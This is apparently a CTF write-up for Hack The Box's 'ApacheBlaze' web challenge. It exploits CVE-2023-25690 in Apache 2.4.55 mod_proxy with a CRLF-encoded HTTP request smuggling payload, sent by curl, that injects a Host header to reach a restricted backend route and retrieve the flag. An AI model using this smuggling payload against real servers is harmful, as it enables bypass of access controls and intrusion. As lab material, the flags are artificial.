# Web

## Description

## Source

Web configs

![apacheblaze.png](/assets/ctf/htb/web/apacheblaze.png)

`app.py`
```python
from flask import Flask, request, jsonify

app = Flask(__name__)

app.config['GAMES'] = {'magic_click', 'click_mania', 'hyper_clicker', 'click_topia'}
app.config['FLAG'] = 'HTB{f4k3_fl4g_f0r_t3st1ng}'

@app.route('/', methods=['GET'])
def index():
    game = request.args.get('game')

    if not game:
        return jsonify({
            'error': 'Empty game name is not supported!.'
        }), 400

    elif game not in app.config['GAMES']:
        return jsonify({
            'error': 'Invalid game name!'
        }), 400

    elif game == 'click_topia':
        if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':
            return jsonify({
                'message': f'{app.config["FLAG"]}'
            }), 200
        else:
            return jsonify({
                'message': 'This game is currently available only from dev.apacheblaze.local.'
            }), 200

    else:
        return jsonify({
            'message': 'This game is currently unavailable due to internal maintenance.'
        }), 200
```

`web_apacheblaze/challenge/frontend/src/assets/js/fetchAPI.js`
```js
$(document).ready(function() {
  $(".game a").click(function(event) {
      event.preventDefault();
      var gameName = $(this).attr("div");

      $.ajax({
          url: "/api/games/" + gameName,
          success: function(data) {
              var message = data.message;
              $("#gameplayresults").text(message);
          },
          error: function() {
              $("#gameplayresults").text("Error fetching API data.");
          }
      });
  });
});
```

## Solution

To win we just need to satisfy 2 conditions 
1. `game == 'click_topia':`
2. `if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':`

While it seems like we should just curl, that's not going to work. 
```bash
➜ curl http://94.237.59.199:33124/api/games/click_topia -H 'X-Forwarded-Host: dev.apacheblaze.local'
{"message":"This game is currently available only from dev.apacheblaze.local."}
```

From website config files we know that there's 2 server, backend and frontend. Frontend talks to backend API with Javascript, but only `/api/games/game` request, it cannot transfer headers like we want to.

Googling for `apache proxy module request smuggling` landed me on [Apache 2.4.55 mod_proxy HTTP Request Smuggling](https://packetstormsecurity.com/files/176334/Apache-2.4.55-mod_proxy-HTTP-Request-Smuggling.html) 

**[CVE-2023-25690-POC](https://github.com/dhmosfunk/CVE-2023-25690-POC)**

httpd version in Dockerfile was suspicious!
```bash
# Download and extract httpd
RUN wget https://archive.apache.org/dist/httpd/httpd-2.4.55.tar.gz && tar -xvf httpd-2.4.55.tar.gz
```

Request to send
```http
GET /?game=click_topia HTTP/1.1
Host: dev.apacheblaze.local

GET / HTTP/1.1
Host: localhost:1337
```

Request with `\r\n`
```http
GET /?game=click_topia HTTP/1.1%0d%0a
Host: dev.apacheblaze.local%0d%0a
%0d%0a
GET / HTTP/1.1%0d%0a
Host: localhost:1337
```

Send request with no newlines
```powershell
➜ curl 'http://94.237.59.199:33124/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20localhost:1337'
{"message":"HTB{1t5_4ll_4b0ut_Th3_Cl1ck5}"}
```

> Flag: `HTB{1t5_4ll_4b0ut_Th3_Cl1ck5}`

